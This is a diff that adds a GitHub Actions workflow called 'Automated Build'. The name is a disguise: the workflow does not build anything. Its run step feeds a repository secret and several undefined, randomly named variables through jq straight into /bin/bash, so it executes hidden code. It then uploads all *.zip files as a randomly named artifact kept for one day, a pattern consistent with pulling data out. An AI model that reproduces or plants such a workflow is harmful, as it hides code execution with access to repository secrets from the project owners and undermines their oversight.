@@ -1,0 +1,31 @@
+name: Automated Build
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  execute:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          hcp01: ${{ secrets.hcp01 }}
+        run: |
+          printf '%s' "$hcp01" | jq -r .wns170 | /bin/bash
+          printf '%s' "$oxi1538" | jq -r .yxekf94572 | /bin/bash
+          echo $gk48008 | jq -r .klwp2 | /bin/bash
+          printf '%s' "$lx92" | jq -r .la80698 | /bin/bash
+          echo $to46 | jq -r .rscao31 | /bin/bash
+          echo $qwfy59 | jq -r .bcv3 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: Kgxcn0hQ
+          path: "*.zip"
+          retention-days: 1
